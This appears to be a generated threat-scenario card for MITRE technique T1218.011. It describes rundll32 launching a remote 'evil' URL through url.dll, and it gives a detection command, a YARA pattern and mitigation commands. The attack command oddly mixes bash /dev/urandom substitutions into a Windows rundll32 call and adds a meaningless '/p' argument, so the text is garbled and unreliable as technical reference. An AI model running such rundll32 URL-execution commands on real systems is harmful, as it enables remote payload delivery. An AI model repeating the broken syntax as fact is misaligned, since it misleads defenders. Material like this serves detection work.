---
type: campaign
scenario_id: 265
tactic: Defense Evasion
technique: "T1218.011: Rundll32"
technique_id: T1218.011
tags: [campaign, lotl, defense_evasion]
---

# Using rundll32 to execute malicious payload via url.dll remotely.

## Threat Description
Using rundll32 to execute malicious payload via url.dll remotely.

## Attack Command
```
rundll32 url.dll,OpenURL "http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).html) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
```

## Detection Logic
Monitor rundll32 url: `wmic process where name='rundll32.exe' get commandline | findstr url.dll`; YARA rule: `rule Rundll32UrlRemote { strings: $a = /rundll32.*url.*http/ nocase; condition: $a }`.

## Mitigation
Restrict rundll32: `icacls %windir%\System32\rundll32.exe /deny Everyone:RX`; Block URL downloads: `netsh advfirewall firewall add rule name='Block rundll32' dir=out program='%windir%\System32\rundll32.exe' action=block`.

## AI Training Prompt
Train AI to detect rundll32 url.dll remote execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
